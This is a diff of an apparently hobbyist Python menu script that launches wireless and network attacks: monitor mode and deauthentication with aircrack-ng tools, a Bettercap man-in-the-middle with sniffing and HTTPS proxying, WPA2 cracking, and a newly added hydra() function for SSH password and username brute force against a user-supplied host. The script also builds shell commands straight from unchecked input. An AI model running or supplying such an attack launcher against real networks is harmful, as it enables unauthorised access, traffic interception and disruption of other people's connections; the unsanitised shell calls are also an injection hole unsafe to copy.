@@ -19,21 +19,43 @@ LIGHT_WHITE ="\033[1;37m"#line:22
 
 while True:
  def banner():
-  print(f"""{LIGHT_PURPLE}
+  print(fr"""{LIGHT_PURPLE}
             _     __                            
  ___ ___ __(_)___/ /__  ___ ____________ ___ ___
 / _ `/ // / / __/  '_/ / _ `/ __/ __/ -_|_-<(_-<
 {PURPLE}\_, /\_,_/_/\__/_/\_\  \_,_/\__/\__/\__/___/___/
- /_/                                {LIGHT_WHITE} By @yyLevi\n""")
+ /_/                                {LIGHT_WHITE} By @yyLevi""")
  
- os.system("clear")
  banner()
- print(f"{LIGHT_GREEN}[1] Enter Monitor Mode & Airodump-ng - Tool airmon-ng")
+ print(f"\n{LIGHT_GREEN}[1] Enter Monitor Mode & Airodump-ng - Tool airmon-ng")
  print(f"{LIGHT_CYAN}[2] Start Deauth - Tool Aireplay-ng")
  print(f"{YELLOW}[3] {LIGHT_RED}SSH Brute Force,{YELLOW} - Tool Cerbrutus ")
  print(f"{LIGHT_WHITE}[4] Man In The Middle - Tool Bettercap")
  print(f"{LIGHT_PURPLE}[5] {LIGHT_BLUE}Crack {LIGHT_WHITE}Wpa2{LIGHT_BLUE} Passwords ")
  print(f"\n{LIGHT_PURPLE}Remember {LIGHT_WHITE}Ctrl+C{LIGHT_PURPLE} Will Bring You Back, {LIGHT_GREEN}ONLY WHEN IN TOOL SCREEN")
+ def hydra():
+  print("\n[1] ssh password brute force")
+  print("[2] ssh username brute force")
+  print("[3] ssh username & password brute force\n")
+  choice = input("Answer: ")
+  if choice == "1":
+   passwd_list = input(f"Enter Your Password List: ")
+   username = input(f"Enter Your Target Username: ")
+   host_ip = input(f"Enter Host_IP: ")
+   threads = input(f"Enter The Amount of Threads: ")
+   os.system(f'hydra -l {username} -P {passwd_list} -t {threads} ssh://{host_ip}')
+  elif choice == "2":
+   passwd = input(f"Targets Password: ")
+   username_list = input(f"Enter Your Username list: ")
+   host_ip = input(f"Enter Host_IP: ")
+   threads = input(f"Enter The Amount of Threads: ")
+   os.system(f'hydra -L {username_list} -p {passwd} -t {threads} ssh://{host_ip}')
+  elif choice == "3":
+   pass_list = input(f"Enter Your Password list: ")
+   user_list = input(f"Enter Your Username list: ")
+   host_ip = input(f"Enter Host_IP: ")
+   threads = input(f"Enter The Amount of Threads: ")
+   os.system(f'hydra -L {user_list} -P {pass_list} -t {threads} ssh://{host_ip}')
  which = input(f"{LIGHT_RED}Which One:{LIGHT_WHITE} ")
  if which == "1":
   interface = input(f"Enter Your Interface: ")
@@ -54,11 +76,7 @@ while True:
   bssid = input(f"Enter The Targets Bssid ")
   os.system(f"sudo aireplay-ng -0 0 -a {ap} -c {bssid} {interface}")
  elif which == "3":
-  passwd_list = input(f"Enter Your Password list OR a password: ")
-  username = input(f"Enter Your Username list OR a Username: ")
-  host_ip = input(f"Enter Host_IP: ")
-  threads = input(f"Enter The Amount of Threads: ")
-  os.system(f'python3 cerbrutus.py {host_ip} SSH -U "{username}" -P "{passwd_list}" -t {threads}')
+  hydra()
  elif which == "4":
   inf = input(f"Enter Your Interface: ")
   os.system(f"sudo bettercap -iface {inf} -eval 'net.sniff on; https.proxy on; net.probe on'")
